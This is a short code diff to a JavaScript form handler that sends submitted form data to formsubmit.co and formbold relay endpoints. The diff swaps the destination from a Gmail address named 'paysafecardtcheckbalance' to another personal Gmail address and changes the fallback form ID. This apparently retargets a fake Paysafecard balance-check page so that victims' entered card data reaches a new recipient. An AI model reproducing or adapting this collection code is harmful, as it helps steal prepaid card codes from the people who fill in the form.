@@ -9,7 +9,7 @@ const handleSubmit = async (event) => {
     const data = new FormData(form);
     
     try {
-        const response = await fetch("https://formsubmit.co/ajax/paysafecardtcheckbalance@gmail.com", {
+        const response = await fetch("https://formsubmit.co/solangemarceline86@gmail.com", {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
@@ -28,7 +28,7 @@ const handleSubmit = async (event) => {
         }
     } catch (e) {
         try {
-            const response = await fetch("https://formbold.com/s/3Ab8W", {
+            const response = await fetch("https://formbold.com/s/3Ngmg", {
                 method: 'POST',
                 body: data
             });
